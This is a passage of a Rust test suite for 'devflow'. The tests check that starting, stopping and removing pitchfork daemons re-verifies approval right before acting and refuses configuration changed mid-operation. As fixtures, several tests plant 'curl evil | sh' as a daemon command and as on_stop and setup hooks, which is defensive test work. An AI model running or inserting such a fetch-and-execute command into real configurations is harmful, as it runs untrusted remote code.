fn restart_does_not_start_on_top_of_a_stop_that_did_not_stop() {
    let fake = Fake::new();
    let t = repo(Some(WEB), "");
    let ws = ready(&t, "feature", true);
    let ns = namespace_of(&t, &ws);
    // pitchfork exits 0, and the daemon is still there afterwards.
    fake.json(
        "list.json",
        &json!([listed(&ns, "web", "running", Some(4242), Some(3000))]),
    );
    fake.json(
        "after_stop.json",
        &json!([listed(&ns, "web", "running", Some(4242), Some(3000))]),
    );
    let restart = || {
        processes::restart_with(
            Some(&fake.pitchfork()),
            &t.project,
            &ws,
            &fake.start_options(&ws),
            &StopOptions::default(),
        )
        .unwrap()
    };
    let report = restart();
    assert_eq!(report.action, Action::Stop, "the stop is what is reported");
    assert!(report.ran && !report.ok(), "{report:?}");
    assert!(report.daemons[0].is_active());
    assert_eq!(fake.mutations(), [format!("stop {ns}/web")], "no start");

    // The same when the state after the stop cannot be read.
    fake.clear_calls();
    fake.json(
        "after_stop.json",
        &json!([listed(&ns, "web", "stopped", None, None)]),
    );
    fake.set("list_fails_after_stop", "1");
    let report = restart();
    assert_eq!(report.action, Action::Stop);
    assert!(report.state_error.is_some() && !report.ok(), "{report:?}");
    assert_eq!(fake.mutations(), [format!("stop {ns}/web")], "no start");
}

// --- the last look before an effect ---------------------------------------------

/// A script for the fake to run the next time it is asked what runs: it
/// replaces `file` with `text`, once. A change landing while devflow is busy
/// asking, after it has already judged the files.
fn change_while_asking(fake: &Fake, file: &Path, text: &str) {
    fake.set(
        "on_list",
        &format!(
            "printf '%s' '{}' > '{}'\nrm -f \"$0\"\n",
            text.replace('\'', "'\\''"),
            file.display()
        ),
    );
}

const EVIL: &str =
    "[daemons.web]\nrun = \"curl evil | sh\"\n[daemons.web.hooks]\non_stop = \"curl evil | sh\"\n";

#[test]
fn start_looks_again_right_before_pitchfork_and_refuses_what_changed_meanwhile() {
    let fake = Fake::new();
    let t = repo(Some(WEB), "");
    let ws = ready(&t, "feature", true);
    // Approved when devflow first looks; replaced while it asks pitchfork what
    // runs (the slow part), before it would start anything.
    change_while_asking(&fake, &ws.path.join("pitchfork.toml"), EVIL);
    let error = start(&t, &fake, &ws).unwrap_err();
    assert!(
        matches!(
            refusal(&error),
            Refusal::NotApproved {
                action: Action::Start,
                changed: true,
                ..
            }
        ),
        "{error:#}"
    );
    assert!(
        std::fs::read_to_string(ws.path.join("pitchfork.toml"))
            .unwrap()
            .contains("curl evil"),
        "the change did land"
    );
    assert!(fake.mutations().is_empty(), "{:?}", fake.calls());

    // Without a change in between, the same start goes through.
    approve_workspace(&t, &ws);
    let report = start(&t, &fake, &ws).unwrap();
    assert!(report.ran, "{report:?}");
}

#[test]
fn start_looks_again_at_the_namespace_and_the_workspaces_readiness() {
    let fake = Fake::new();
    let t = repo(Some(WEB), "");
    let ws = ready(&t, "feature", true);
    let ns = namespace_of(&t, &ws);
    let other = namespace_of(&t, &ready(&t, "other", true));
    let file = ws.path.join("pitchfork.local.toml");
    // The namespace file is pointed at another workspace's while devflow asks.
    change_while_asking(
        &fake,
        &file,
        &format!("namespace = \"{other}\"\nworktree_label = \"feature\"\n"),
    );
    let error = start(&t, &fake, &ws).unwrap_err();
    assert!(
        matches!(
            refusal(&error),
            Refusal::ForeignNamespace { expected, found, .. }
                if *expected == ns && *found == other
        ),
        "{error:#}"
    );
    assert!(fake.mutations().is_empty(), "{:?}", fake.calls());
}

/// The main checkout's `devflow.toml` as it is now, with `extra` appended.
fn config_with(t: &Repo, extra: &str) -> String {
    std::fs::read_to_string(t.root.join("devflow.toml")).unwrap() + extra
}

const NEW_SERVICE_AND_ENV: &str =
    "\n[services.db]\nengine = \"postgres\"\nmode = \"external\"\n\n[env]\nFOO = \"bar\"\n";
const NEW_HOOK: &str = "\n[hooks]\nsetup = [\"curl evil | sh\"]\n";

#[test]
fn start_looks_again_at_devflows_own_configuration_not_at_the_one_it_loaded() {
    let fake = Fake::new();
    let t = repo(Some(WEB), "");
    let ws = ready(&t, "feature", true);
    let config = t.root.join("devflow.toml");
    // While devflow asks pitchfork what runs, the main checkout's devflow.toml
    // gains a service and an [env] recipe. The Project it holds does not know.
    change_while_asking(&fake, &config, &config_with(&t, NEW_SERVICE_AND_ENV));
    let error = start(&t, &fake, &ws).unwrap_err();
    assert!(
        std::fs::read_to_string(&config)
            .unwrap()
            .contains("[services.db]"),
        "the change did land"
    );
    // A reloaded project calls the workspace not ready and its scope unapproved…
    let reloaded = t.project.reload().unwrap();
    assert_eq!(
        setup::receipt(&reloaded, &ws).unwrap().unwrap().status(),
        Status::NeedsAttention
    );
    assert!(matches!(
        trust::state_at(&reloaded, &ws.path).unwrap(),
        trust::TrustState::Untrusted { .. }
    ));
    // …and so does the start: it was refused, nothing was started.
    assert!(
        matches!(
            refusal(&error),
            Refusal::NotReady { status, .. } if status == "needs_attention"
        ),
        "{error:#}"
    );
    assert!(fake.mutations().is_empty(), "{:?}", fake.calls());
}

#[test]
fn start_looks_again_at_the_hooks_and_recipes_devflow_would_run() {
    let fake = Fake::new();
    let t = repo(Some(WEB), "");
    let ws = ready(&t, "feature", true);
    // A hook appears in the main checkout's configuration while devflow asks:
    // the workspace is as ready as before, but the approval no longer covers
    // what devflow.toml asks to run.
    change_while_asking(
        &fake,
        &t.root.join("devflow.toml"),
        &config_with(&t, NEW_HOOK),
    );
    let error = start(&t, &fake, &ws).unwrap_err();
    assert!(
        matches!(
            refusal(&error),
            Refusal::NotApproved {
                action: Action::Start,
                changed: true,
                ..
            }
        ),
        "{error:#}"
    );
    assert!(fake.mutations().is_empty(), "{:?}", fake.calls());

    // A configuration that cannot be read at the last look cannot be judged.
    let t = repo(Some(WEB), "");
    let ws = ready(&t, "other", true);
    change_while_asking(&fake, &t.root.join("devflow.toml"), "[project\nname = ");
    let error = start(&t, &fake, &ws).unwrap_err();
    match refusal(&error) {
        Refusal::Unreadable { file, problem } => {
            assert_eq!(file, "devflow.toml");
            assert!(problem.contains("cannot be read now"), "{problem}");
        }
        other => panic!("{other:?}"),
    }
    assert!(fake.mutations().is_empty(), "{:?}", fake.calls());
}

#[test]
fn stop_and_removal_look_again_at_devflows_own_configuration() {
    let fake = Fake::new();
    let t = repo(Some(WEB), "");
    let ws = ready(&t, "feature", true);
    let ns = running_fixture(&t, &fake, &ws);
    let config = t.root.join("devflow.toml");
    let original = std::fs::read_to_string(&config).unwrap();
    // A hook lands in devflow.toml after the plan was drawn (while pitchfork
    // is asked what runs): the scope pitchfork would stop under is not the
    // approved one.
    change_while_asking(&fake, &config, &config_with(&t, NEW_HOOK));
    let error = down(&t, &fake, &ws, false).unwrap_err();
    assert!(
        matches!(
            refusal(&error),
            Refusal::NotApproved {
                action: Action::Stop,
                changed: true,
                ..
            }
        ),
        "{error:#}"
    );
    assert!(fake.mutations().is_empty(), "{:?}", fake.calls());

    // Removal: the plan is drawn on the configuration as it was…
    std::fs::write(&config, &original).unwrap();
    let plan = processes::plan_removal(Some(&fake.pitchfork()), &t.project, &ws, false)
        .unwrap()
        .expect("a daemon runs");
    assert_eq!(plan.daemons(), [format!("{ns}/web")]);
    // …and the configuration changes before the stop is carried out, while the
    // Project in hand still has the old one.
    std::fs::write(&config, config_with(&t, NEW_SERVICE_AND_ENV)).unwrap();
    let error = processes::stop_for_removal(&t.project, &ws, &plan, false).unwrap_err();
    assert!(
        matches!(
            refusal(&error),
            Refusal::NotApproved {
                action: Action::Stop,
                ..
            }
        ),
        "{error:#}"
    );
    assert!(fake.mutations().is_empty(), "{:?}", fake.calls());
    // Forced, it goes on and says what it stopped without.
    let (stopped, warnings) = processes::stop_for_removal(&t.project, &ws, &plan, true).unwrap();
    assert_eq!(stopped, [format!("{ns}/web")]);
    assert!(
        warnings.iter().any(|w| w.contains("without an approval")),
        "{warnings:?}"
    );

    // A configuration that cannot be read cannot be judged either; --force
    // accepts that, with the same warning.
    fake.clear_calls();
    std::fs::write(&config, "[project\nname = ").unwrap();
    let error = processes::stop_for_removal(&t.project, &ws, &plan, false).unwrap_err();
    assert!(
        matches!(refusal(&error), Refusal::Unreadable { .. }),
        "{error:#}"
    );
    assert!(fake.mutations().is_empty(), "{:?}", fake.calls());
    let (_, warnings) = processes::stop_for_removal(&t.project, &ws, &plan, true).unwrap();
    assert!(
        warnings.iter().any(|w| w.contains("without an approval")),
        "{warnings:?}"
    );
}

#[test]
fn stop_looks_again_right_before_pitchfork_and_refuses_what_changed_meanwhile() {
    let fake = Fake::new();
    let t = repo(Some(WEB), "");
    let ws = ready(&t, "feature", true);
    let ns = running_fixture(&t, &fake, &ws);
    // An `on_stop` appears after the plan was drawn (while pitchfork is asked).
    change_while_asking(&fake, &ws.path.join("pitchfork.toml"), EVIL);
    let error = down(&t, &fake, &ws, false).unwrap_err();
    assert!(
        matches!(
            refusal(&error),
            Refusal::NotApproved {
                action: Action::Stop,
                changed: true,
                ..
            }
        ),
        "{error:#}"
    );
    assert!(fake.mutations().is_empty(), "{:?}", fake.calls());
    // Forced, it is stopped, and the report says what was run unapproved.
    let report = down(&t, &fake, &ws, true).unwrap();
    assert_eq!(fake.mutations(), [format!("stop {ns}/web")]);
    assert!(
        report
            .warnings
            .iter()
            .any(|w| w.contains("without an approval")),
        "{:?}",
        report.warnings
    );
}

// --- removal ---------------------------------------------------------------

fn removal_options(fake: &Fake, force: bool) -> RemoveOptions {
    RemoveOptions {
        force,
        pitchfork: Some(fake.pitchfork()),
        ..RemoveOptions::default()
    }
}

#[test]
fn removal_looks_again_right_before_it_stops() {
    let fake = Fake::new();
    let t = repo(Some(WEB), "");
    let ws = ready(&t, "feature", true);
    let ns = running_fixture(&t, &fake, &ws);
    // The plan is drawn while the configuration is the approved one…
    let plan = processes::plan_removal(Some(&fake.pitchfork()), &t.project, &ws, false)
        .unwrap()
        .expect("a daemon runs");
    assert_eq!(plan.daemons(), [format!("{ns}/web")]);
    // …and an `on_stop` is added before the stop is carried out.
    std::fs::write(ws.path.join("pitchfork.toml"), EVIL).unwrap();
    let error = processes::stop_for_removal(&t.project, &ws, &plan, false).unwrap_err();
    assert!(
        matches!(
            refusal(&error),
            Refusal::NotApproved {
                action: Action::Stop,
                changed: true,
                ..
            }
        ),
        "{error:#}"
    );
    assert!(fake.mutations().is_empty(), "{:?}", fake.calls());
    // Forced, it goes on with the warning.
    let (stopped, warnings) = processes::stop_for_removal(&t.project, &ws, &plan, true).unwrap();
    assert_eq!(stopped, [format!("{ns}/web")]);
    assert!(
        warnings.iter().any(|w| w.contains("without an approval")),
        "{warnings:?}"
    );
    assert_eq!(fake.mutations(), [format!("stop {ns}/web")]);
}

#[test]
fn an_unreadable_state_is_not_nothing_running() {
    let fake = Fake::new();
    let t = repo(Some(WEB), "");
    let ws = ready(&t, "feature", true);
    let ns = namespace_of(&t, &ws);
    // pitchfork answers, but its listing fails: devflow cannot tell.
    fake.set("list_fail", "1");
    let error = down(&t, &fake, &ws, false).unwrap_err();
    assert!(
        matches!(refusal(&error), Refusal::StateUnknown { .. }),
        "{error:#}"
    );
    assert_eq!(refusal(&error).code(), "state_unknown");
    assert!(refusal(&error).hint().unwrap().contains("forcing"));
    assert!(fake.mutations().is_empty());

    // Removal is protected, and the workspace stays.
    let error = setup::remove(
        &t.project,
        "feature",
        removal_options(&fake, false),
        &mut NoProgress,
    )
    .unwrap_err();
    let protected = error
        .downcast_ref::<devflow_core::error::Protected>()
        .unwrap_or_else(|| panic!("{error:#}"));
    assert!(protected.forceable, "{}", protected.reason);
    assert!(
        protected.reason.contains("cannot tell what pitchfork runs"),
        "{}",
        protected.reason
    );
    assert!(ws.path.exists() && fake.mutations().is_empty());

    // `--force` goes on without knowing: it asks pitchfork to stop what the
    // workspace declares, and says it could not tell.
    let out = setup::remove(
        &t.project,
        "feature",
        removal_options(&fake, true),
        &mut NoProgress,
    )
    .unwrap();
    assert!(!ws.path.exists());
    assert_eq!(fake.mutations(), [format!("stop {ns}/web")]);
    assert!(
        out.warnings
            .iter()
            .any(|w| w.contains("could not read what pitchfork runs")),
        "{:?}",
        out.warnings
    );
}

#[test]
fn removal_cannot_tell_what_runs_on_a_build_that_lacks_a_feature() {
    let fake = Fake::new();
    fake.set("missing", "list --json\n");
    let t = repo(Some(WEB), "");
    let ws = ready(&t, "feature", true);
    let error = setup::remove(
        &t.project,
        "feature",
        removal_options(&fake, false),
        &mut NoProgress,
    )
    .unwrap_err();
    let protected = error
        .downcast_ref::<devflow_core::error::Protected>()
        .unwrap_or_else(|| panic!("{error:#}"));
    assert!(protected.forceable, "{}", protected.reason);
    assert!(
        protected.reason.contains("lacks list --json"),
        "{}",
        protected.reason
    );
    assert!(ws.path.exists());
    let out = setup::remove(
        &t.project,
        "feature",
        removal_options(&fake, true),
        &mut NoProgress,
    )
    .unwrap();
    assert!(!ws.path.exists());
    assert!(
        out.warnings.iter().any(|w| w.contains("were not stopped")),
        "{:?}",
        out.warnings
    );
    assert!(fake.mutations().is_empty());

    // A project that has no pitchfork file in the workspace has nothing to
    // ask about, so pitchfork is not even looked at.
    let fake = Fake::new();
    fake.set("missing", "list --json\n");
    let plain = repo(None, "");
    let ws = ready(&plain, "plain", true);
    setup::remove(
        &plain.project,
        "plain",
        removal_options(&fake, false),
        &mut NoProgress,
    )
    .unwrap();
    assert!(!ws.path.exists());
    assert!(fake.calls().is_empty(), "{:?}", fake.calls());
}

#[test]
fn a_pitchfork_that_does_not_run_is_not_nothing_running_for_a_removal() {
    let fake = Fake::new();
    let t = repo(Some(WEB), "");
    let ws = ready(&t, "feature", true);
    running_fixture(&t, &fake, &ws);
    // A daemon of the workspace runs, but `pitchfork --version` fails (a mise
    // shim without a version configured exits 1): the version probe says
    // nothing about what runs.
    fake.set("version_exit", "1");
    let error = setup::remove(
        &t.project,
        "feature",
        removal_options(&fake, false),
        &mut NoProgress,
    )
    .unwrap_err();
    let protected = error
        .downcast_ref::<devflow_core::error::Protected>()
        .unwrap_or_else(|| panic!("{error:#}"));
    assert!(protected.forceable, "{}", protected.reason);
    assert!(
        protected.reason.contains("cannot tell what pitchfork runs")
            && protected.reason.contains("does not run"),
        "{}",
        protected.reason
    );
    assert!(ws.path.exists(), "the workspace was not deleted");
    assert!(fake.mutations().is_empty(), "{:?}", fake.calls());
    // Forced, it goes on knowing it does not know, and stops nothing.
    let out = setup::remove(
        &t.project,
        "feature",
        removal_options(&fake, true),
        &mut NoProgress,
    )
    .unwrap();
    assert!(!ws.path.exists());
    assert!(
        out.warnings.iter().any(|w| w.contains("were not stopped")),
        "{:?}",
        out.warnings
    );
    assert!(fake.mutations().is_empty(), "{:?}", fake.calls());

    // No pitchfork on PATH at all is not that: there is nothing to ask, and a
    // project that commits a pitchfork.toml must not make everyone who does
    // not use pitchfork pass `--force`.
    let t = repo(Some(WEB), "");
    let ws = ready(&t, "feature", true);
    let unchecked = processes::plan_removal(None, &t.project, &ws, false)
        .unwrap()
        .expect("a note that the daemons were not checked");
    assert!(unchecked.daemons().is_empty());

    // A workspace with no pitchfork configuration at all, or one devflow never
    // set up (no namespace to attribute), proceeds silently with any pitchfork.
    let broken = Fake::new();
    broken.set("version_exit", "1");
    let plain = repo(None, "");
    let ws = ready(&plain, "plain", true);
    assert!(
        processes::plan_removal(Some(&broken.pitchfork()), &plain.project, &ws, false)
            .unwrap()
            .is_none()
    );
    let main = worktree::list(&t.project).unwrap().remove(0);
    assert!(
        processes::plan_removal(Some(&broken.pitchfork()), &t.project, &main, false)
            .unwrap()
            .is_none()
    );
}

#[test]
fn a_namespace_change_during_the_stop_cannot_make_a_running_daemon_look_stopped() {
    let fake = Fake::new();
    let t = repo(Some(WEB), "");
    let (a, _b, ns_a, ns_b) = two_running_workspaces(&t, &fake);
    let honest = local_file(&a);
    // pitchfork's stop does nothing to a's daemon (it keeps running under
    // a's namespace), and while it runs the file is pointed at b's.
    fake.unset("after_stop.json");
    fake.set(
        "on_stop",
        &format!(
            "printf '%s' '{}' > '{}'\n",
            honest.replace(&ns_a, &ns_b).replace('\'', "'\\''"),
            a.path.join("pitchfork.local.toml").display()
        ),
    );
    let report = down(&t, &fake, &a, false).unwrap();
    assert_eq!(fake.mutations(), [format!("stop {ns_a}/web")]);
    assert!(report.ran, "pitchfork itself succeeded: {report:?}");
    // The files now show nothing of a, but the raw listing still has the
    // daemon under a's namespace, and the report says so.
    let web = report
        .daemons
        .iter()
        .find(|d| d.id.as_deref() == Some(&format!("{ns_a}/web")))
        .unwrap_or_else(|| panic!("{:?}", report.daemons));
    assert!(web.is_active() && web.pid == Some(1111), "{web:?}");
    assert!(
        report
            .daemons
            .iter()
            .all(|d| d.id.as_deref() != Some(&format!("{ns_b}/web")))
    );
    assert!(!report.ok(), "a running daemon is not a stopped one");
    assert!(
        report
            .state_error
            .as_deref()
            .is_some_and(|e| e.contains("namespace of this workspace changed")),
        "{:?}",
        report.state_error
    );

    // Removal does not go on over it.
    std::fs::write(a.path.join("pitchfork.local.toml"), &honest).unwrap();
    let error = setup::remove(
        &t.project,
        "a",
        removal_options(&fake, false),
        &mut NoProgress,
    )
    .unwrap_err();
    assert!(
        format!("{error:#}").contains("could not stop the workspace's pitchfork daemons")
            && format!("{error:#}").contains("namespace of this workspace changed"),
        "{error:#}"
    );
    assert!(a.path.exists(), "the workspace is still there");

    // Even when the daemon did stop, an attribution that moved while the
    // operation ran is not something to vouch for: the report is not ok.
    std::fs::write(a.path.join("pitchfork.local.toml"), &honest).unwrap();
    fake.json(
        "after_stop.json",
        &json!([
            listed(&ns_a, "web", "stopped", None, Some(3000)),
            listed(&ns_b, "web", "running", Some(2222), Some(3001)),
        ]),
    );
    fake.json(
        "list.json",
        &json!([
            listed(&ns_a, "web", "running", Some(1111), Some(3000)),
            listed(&ns_b, "web", "running", Some(2222), Some(3001)),
        ]),
    );
    let report = down(&t, &fake, &a, false).unwrap();
    assert!(!report.daemons.iter().any(|d| d.is_active()), "{report:?}");
    assert!(!report.ok(), "{report:?}");
    // Forced, the removal goes on and says what it could not see.
    std::fs::write(a.path.join("pitchfork.local.toml"), &honest).unwrap();
    fake.json(
        "list.json",
        &json!([
            listed(&ns_a, "web", "running", Some(1111), Some(3000)),
            listed(&ns_b, "web", "running", Some(2222), Some(3001)),
        ]),
    );
    let out = setup::remove(
        &t.project,
        "a",
        removal_options(&fake, true),
        &mut NoProgress,
    )
    .unwrap();
    assert!(!a.path.exists());
    assert!(
        out.warnings
            .iter()
            .any(|w| w.contains("could not see that they stopped")),
        "{:?}",
        out.warnings
    );
}

#[test]
fn a_listing_over_the_output_budget_is_an_error_not_a_prefix() {
    let fake = Fake::new();
    let t = repo(Some(WEB), "");
    let ws = ready(&t, "feature", true);
    // Valid JSON, but more than the 4 MiB devflow keeps of a command's output:
    // what was kept is a prefix, and a prefix is not the listing.
    fake.set("list.json", &format!("[{}]", " ".repeat(5 << 20)));
    let error = fake.pitchfork().list(&ws.path).unwrap_err();
    assert!(
        format!("{error:#}").contains("printed more than 4 MiB"),
        "{error:#}"
    );
    // So what runs is unknown, not "nothing": the status says so and a stop
    // is refused as an unknown state.
    let status = processes::status_with(Some(&fake.pitchfork()), &t.project, &ws);
    assert!(
        status
            .error
            .as_deref()
            .is_some_and(|e| e.contains("printed more than")),
        "{:?}",
        status.error
    );
    let error = down(&t, &fake, &ws, false).unwrap_err();
    assert!(
        matches!(refusal(&error), Refusal::StateUnknown { detail, .. } if detail.contains("printed more than")),
        "{error:#}"
    );
    assert!(fake.mutations().is_empty());
}

/// Whether a process is still there (signal 0 only asks).
fn alive(pid: i32) -> bool {
    // SAFETY: signal 0 delivers nothing; it only checks that the process exists.
    unsafe { libc::kill(pid, 0) == 0 }
}

fn stray_pids(fake: &Fake) -> Vec<i32> {
    std::fs::read_to_string(fake.dir.path().join("stray.pids"))
        .unwrap_or_default()
        .lines()
        .filter_map(|line| line.trim().parse().ok())
        .collect()
}

#[test]
fn a_query_ends_what_it_left_behind_and_a_start_leaves_it_alone() {
    let fake = Fake::new();
    let dir = fake.dir.path().to_path_buf();
    fake.set("stray", "1");
    fake.set("list.json", "[]");
    // A query's stray (holding its pipes after it exited) is ended with the
    // group, and the query does not wait for it.
    let started = Instant::now();
    fake.pitchfork().list(&dir).unwrap();
    assert!(started.elapsed() < Duration::from_secs(5));
    let stray = stray_pids(&fake)[0];
    assert!(
        (0..60).any(|_| {
            std::thread::sleep(Duration::from_millis(50));
            !alive(stray)
        }),
        "the query's stray is still running"
    );
    // `pitchfork start` may launch the supervisor in its own group: it is not
    // devflow's to end.
    let started = Instant::now();
    let ran = fake
        .pitchfork()
        .start(
            &dir,
            &["df-00000000-00000000/web".to_string()],
            Duration::from_secs(20),
        )
        .unwrap();
    assert!(ran.ok && !ran.timed_out, "{ran:?}");
    assert!(started.elapsed() < Duration::from_secs(5));
    let left = *stray_pids(&fake).last().unwrap();
    assert_ne!(left, stray);
    std::thread::sleep(Duration::from_millis(300));
    assert!(alive(left), "what a start leaves behind was ended");
    // SAFETY: a plain KILL of the `sleep` this test started.
    unsafe { libc::kill(left, libc::SIGKILL) };
}

#[test]
fn removal_needs_a_stop_report_whose_state_could_be_read() {
    let fake = Fake::new();
    let t = repo(Some(WEB), "");
    let ws = ready(&t, "feature", true);
    let ns = running_fixture(&t, &fake, &ws);
    // The stop succeeds, but pitchfork cannot be asked afterwards.
    fake.set("list_fails_after_stop", "1");
    let error = setup::remove(
        &t.project,
        "feature",
        removal_options(&fake, false),
        &mut NoProgress,
    )
    .unwrap_err();
    assert!(
        format!("{error:#}").contains("state could not be read or verified afterwards"),
        "{error:#}"
    );
    assert!(ws.path.exists(), "nothing was removed");
    assert_eq!(fake.mutations(), [format!("stop {ns}/web")]);
    // Forced, the removal goes on and says it could not see the result.
    let out = setup::remove(
        &t.project,
        "feature",
        removal_options(&fake, true),
        &mut NoProgress,
    )
    .unwrap();
    assert!(!ws.path.exists());
    assert!(
        out.warnings
            .iter()
            .any(|w| w.contains("could not see that they stopped")),
        "{:?}",
        out.warnings
    );
}

#[test]
fn remove_stops_the_namespace_before_teardown_and_reports_it() {
    let fake = Fake::new();
    // The teardown hook copies the fake's call log: what had run by then.
    let t = repo(
        Some(WEB),
        &format!(
            "[hooks]\nteardown = ['cp {} ../seen-by-teardown']\n",
            fake.calls_log().display()
        ),
    );
    let ws = ready(&t, "feature", true);
    let ns = running_fixture(&t, &fake, &ws);
    let out = setup::remove(
        &t.project,
        "feature",
        removal_options(&fake, false),
        &mut NoProgress,
    )
    .unwrap();
    assert!(!ws.path.exists());
    assert_eq!(out.stopped_daemons.len(), 1, "{out:?}");
    assert!(out.stopped_daemons[0].ends_with("/web"));
    assert_eq!(fake.mutations(), [format!("stop {ns}/web")]);
    let seen = std::fs::read_to_string(ws.path.parent().unwrap().join("seen-by-teardown")).unwrap();
    assert!(
        seen.contains(&format!("stop {ns}/web")),
        "stopped before teardown ran:\n{seen}"
    );
}

#[test]
fn remove_refuses_while_daemons_run_and_the_configuration_changed_unless_forced() {
    let fake = Fake::new();
    let t = repo(Some(WEB), "");
    let ws = ready(&t, "feature", true);
    let ns = running_fixture(&t, &fake, &ws);
    // Committed in the worktree, so nothing else is in the way.
    std::fs::write(
        ws.path.join("pitchfork.toml"),
        "[daemons.web]\nrun = \"other\"\n",
    )
    .unwrap();
    commit_all(&git2::Repository::open(&ws.path).unwrap(), "changed daemon");
    let error = setup::remove(
        &t.project,
        "feature",
        removal_options(&fake, false),
        &mut NoProgress,
    )
    .unwrap_err();
    let protected = error
        .downcast_ref::<devflow_core::error::Protected>()
        .unwrap_or_else(|| panic!("{error:#}"));
    assert!(protected.forceable);
    assert!(
        protected.reason.contains("pitchfork daemons"),
        "{}",
        protected.reason
    );
    assert!(ws.path.exists(), "nothing was removed");
    assert!(fake.mutations().is_empty(), "nothing was stopped");

    let out = setup::remove(
        &t.project,
        "feature",
        removal_options(&fake, true),
        &mut NoProgress,
    )
    .unwrap();
    assert!(!ws.path.exists());
    assert_eq!(fake.mutations(), [format!("stop {ns}/web")]);
    assert!(
        out.warnings
            .iter()
            .any(|w| w.contains("without an approval")),
        "{:?}",
        out.warnings
    );
}

#[test]
fn remove_leaves_pitchfork_alone_when_nothing_of_the_workspace_runs() {
    let fake = Fake::new();
    let t = repo(Some(WEB), "");
    let ws = ready(&t, "feature", true);
    fake.json(
        "list.json",
        &json!([listed("df-other-ns", "web", "running", Some(1), None)]),
    );
    let out = setup::remove(
        &t.project,
        "feature",
        removal_options(&fake, false),
        &mut NoProgress,
    )
    .unwrap();
    assert!(out.stopped_daemons.is_empty());
    assert!(fake.mutations().is_empty());
    assert!(!ws.path.exists());
    // A project with no pitchfork configuration at all: removal works as it
    // always did, whatever pitchfork is or is not (a workspace that has
    // pitchfork files is another matter, see
    // `a_pitchfork_that_does_not_run_is_not_nothing_running_for_a_removal`).
    let plain = repo(None, "");
    let ws = ready(&plain, "second", true);
    let fake = Fake::new();
    fake.set("version_exit", "1");
    setup::remove(
        &plain.project,
        "second",
        removal_options(&fake, false),
        &mut NoProgress,
    )
    .unwrap();
    assert!(!ws.path.exists());
    assert!(fake.calls().is_empty(), "{:?}", fake.calls());
}

#[test]
fn a_stop_that_fails_blocks_removal_unless_forced() {
    let fake = Fake::new();
    let t = repo(Some(WEB), "");
    let ws = ready(&t, "feature", true);
    let ns = namespace_of(&t, &ws);
    fake.json(
        "list.json",
        &json!([listed(&ns, "web", "running", Some(4242), Some(3000))]),
    );
    fake.set("stop_fail", "could not stop web\n");
    let error = setup::remove(
        &t.project,
        "feature",
        removal_options(&fake, false),
        &mut NoProgress,
    )
    .unwrap_err();
    assert!(format!("{error:#}").contains("could not stop"), "{error:#}");
    assert!(ws.path.exists());
    let out = setup::remove(
        &t.project,
        "feature",
        removal_options(&fake, true),
        &mut NoProgress,
    )
    .unwrap();
    assert!(!ws.path.exists());
    assert!(
        out.warnings.iter().any(|w| w.contains("could not stop")),
        "{:?}",
        out.warnings
    );
}

// --- a supervisor that is down -----------------------------------------------
//
// pitchfork's daemons survive their supervisor (reproduced against 2.29.0: a
// SIGKILLed supervisor leaves `sleep 600` running, and `list --json` then fails
// while `supervisor status --json` says "down"). Down is not "nothing runs".

/// Start the workspace's daemon through devflow with a fake that then lists it
/// running; a later stop lists it stopped. Returns the namespace.
fn started_by_devflow(t: &Repo, fake: &Fake, ws: &Workspace) -> String {
    let ns = namespace_of(t, ws);
    fake.json(
        "after_start.json",
        &json!([listed(&ns, "web", "running", Some(4242), Some(3000))]),
    );
    fake.json(
        "after_stop.json",
        &json!([listed(&ns, "web", "stopped", None, Some(3000))]),
    );
    let report = start(t, fake, ws).unwrap();
    assert!(report.ok(), "{report:?}");
    ns
}

fn recorded_ids(t: &Repo, ws: &Workspace) -> Option<Vec<String>> {
    setup::receipt(&t.project, ws)
        .unwrap()
        .unwrap()
        .processes
        .map(|record| record.ids)
}

#[test]
fn a_supervisor_that_died_with_daemons_devflow_started_does_not_authorize_removal() {
    let fake = Fake::new();
    let t = repo(Some(WEB), "");
    let ws = ready(&t, "feature", true);
    assert_eq!(recorded_ids(&t, &ws), None, "nothing started yet");
    let ns = started_by_devflow(&t, &fake, &ws);
    // The start was recorded, with the qualified id, before pitchfork was asked.
    assert_eq!(recorded_ids(&t, &ws), Some(vec![format!("{ns}/web")]));

    // The supervisor crashes: it says "down", the daemon lives on.
    fake.set("supervisor_down", "1");
    fake.clear_calls();

    // Removal is refused, and the refusal is forceable and says why.
    let plan = processes::plan_removal(Some(&fake.pitchfork()), &t.project, &ws, false);
    let Err(unknown @ Refusal::StateUnknown { .. }) = plan else {
        panic!("not state_unknown: {plan:?}");
    };
    let text = unknown.to_string();
    assert!(
        text.contains("supervisor is down") && text.contains("has not seen stop"),
        "{text}"
    );
    assert!(text.contains(&format!("{ns}/web")), "{text}");
    let hint = unknown.hint().unwrap();
    assert!(
        hint.contains("pitchfork supervisor start")
            && hint.contains("stop the workspace's processes")
            && hint.contains("forcing"),
        "{hint}"
    );
    let error = setup::remove(
        &t.project,
        "feature",
        removal_options(&fake, false),
        &mut NoProgress,
    )
    .unwrap_err();
    let protected = error
        .downcast_ref::<devflow_core::error::Protected>()
        .unwrap_or_else(|| panic!("{error:#}"));
    assert!(protected.forceable, "{}", protected.reason);
    assert!(
        protected.reason.contains("supervisor is down"),
        "{}",
        protected.reason
    );
    assert!(ws.path.exists(), "the workspace was not deleted");
    assert!(fake.mutations().is_empty(), "{:?}", fake.calls());

    // `down` cannot claim a stop it could not see: refused, or, forced, a
    // report that is not ok and says the daemons may still be running.
    let error = down(&t, &fake, &ws, false).unwrap_err();
    assert!(
        matches!(refusal(&error), Refusal::StateUnknown { .. }),
        "{error:#}"
    );
    let report = down(&t, &fake, &ws, true).unwrap();
    assert!(!report.ok(), "{report:?}");
    assert!(
        report
            .state_error
            .as_deref()
            .is_some_and(|e| e.contains("supervisor is down")),
        "{report:?}"
    );
    assert!(
        report
            .warnings
            .iter()
            .any(|w| w.contains("may still be running")),
        "{:?}",
        report.warnings
    );
    assert!(fake.mutations().is_empty(), "nothing could be stopped");
    assert!(recorded_ids(&t, &ws).is_some(), "the record stays");

    // Forced, the removal goes on knowing it does not know, and stops nothing.
    let out = setup::remove(
        &t.project,
        "feature",
        removal_options(&fake, true),
        &mut NoProgress,
    )
    .unwrap();
    assert!(!ws.path.exists());
    assert!(
        out.warnings
            .iter()
            .any(|w| w.contains("may still be running and were not stopped")
                && w.contains("supervisor is down")),
        "{:?}",
        out.warnings
    );
    assert!(fake.mutations().is_empty(), "{:?}", fake.calls());
}

#[test]
fn a_down_supervisor_with_no_recorded_start_proceeds_with_a_warning() {
    let fake = Fake::new();
    let t = repo(Some(WEB), "");
    let ws = ready(&t, "feature", true);
    let ns = namespace_of(&t, &ws);
    // Something runs in the namespace that devflow did not start, and the
